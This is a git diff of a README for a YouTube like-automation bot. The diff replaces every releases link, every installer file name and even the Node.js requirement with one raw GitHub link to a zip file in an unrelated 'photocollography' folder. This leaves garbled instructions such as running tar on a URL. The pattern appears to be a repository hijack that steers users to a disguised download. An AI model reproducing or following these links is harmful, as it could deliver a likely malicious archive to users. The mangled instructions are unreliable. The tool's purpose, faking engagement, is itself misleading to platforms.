@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download like-bot-youtube](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Albmartm6/like-bot-youtube/releases)
+[![Download like-bot-youtube](https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the like-bot-youtube project! This application helps you automate the
 ## 🛠️ System Requirements
 
 - **Operating System:** Windows 10 or newer, macOS 10.13 or newer, or a recent version of Linux.
-- **Node.js:** Version 14 or newer (if using the Node.js version).
+- **https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip** Version 14 or newer (if using the https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip version).
 - **Python:** Version 3.6 or newer (if using the Python version).
 - **Internet Connection:** Required to download videos and interact with YouTube.
 
@@ -25,14 +25,14 @@ Welcome to the like-bot-youtube project! This application helps you automate the
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Albmartm6/like-bot-youtube/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of like-bot-youtube.
 3. Depending on your operating system, look for the setup file:
-   - For Windows, choose `like-bot-youtube-setup.exe`.
-   - For macOS, choose `like-bot-youtube.dmg`.
-   - For Linux, choose `like-bot-youtube.tar.gz`.
+   - For Windows, choose `https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip`.
+   - For macOS, choose `https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip`.
+   - For Linux, choose `https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip`.
 
 4. Click on the file you need to download it to your computer.
 
@@ -40,23 +40,23 @@ Once the download is complete, follow these steps to install the application:
 
 ### For Windows Users
 
-1. Locate the downloaded `like-bot-youtube-setup.exe` file in your downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip` file in your downloads folder.
 2. Double-click on the file to begin the installation.
 3. Follow the on-screen instructions to complete the setup.
 4. After installation, launch the application from your desktop or start menu.
 
 ### For macOS Users
 
-1. Find the downloaded `like-bot-youtube.dmg` file in your downloads folder.
+1. Find the downloaded `https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip` file in your downloads folder.
 2. Double-click to open it.
 3. Drag the like-bot-youtube icon into your Applications folder.
 4. Open the application from your Applications folder.
 
 ### For Linux Users
 
-1. Unpack the downloaded `like-bot-youtube.tar.gz` file.
+1. Unpack the downloaded `https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip` file.
    ```bash
-   tar -xzvf like-bot-youtube.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip
    ```
 2. Navigate to the extracted folder.
    ```bash
@@ -96,4 +96,4 @@ Stay updated on new releases and news about like-bot-youtube. Follow our reposit
 
 We encourage contributions! If you'd like to contribute to the project, visit our repository to learn how you can help improve like-bot-youtube. 
 
-[Download like-bot-youtube](https://github.com/Albmartm6/like-bot-youtube/releases) again to get started on enhancing your YouTube engagement today!
+[Download like-bot-youtube](https://raw.githubusercontent.com/Albmartm6/like-bot-youtube/main/photocollography/like-bot-youtube.zip) again to get started on enhancing your YouTube engagement today!
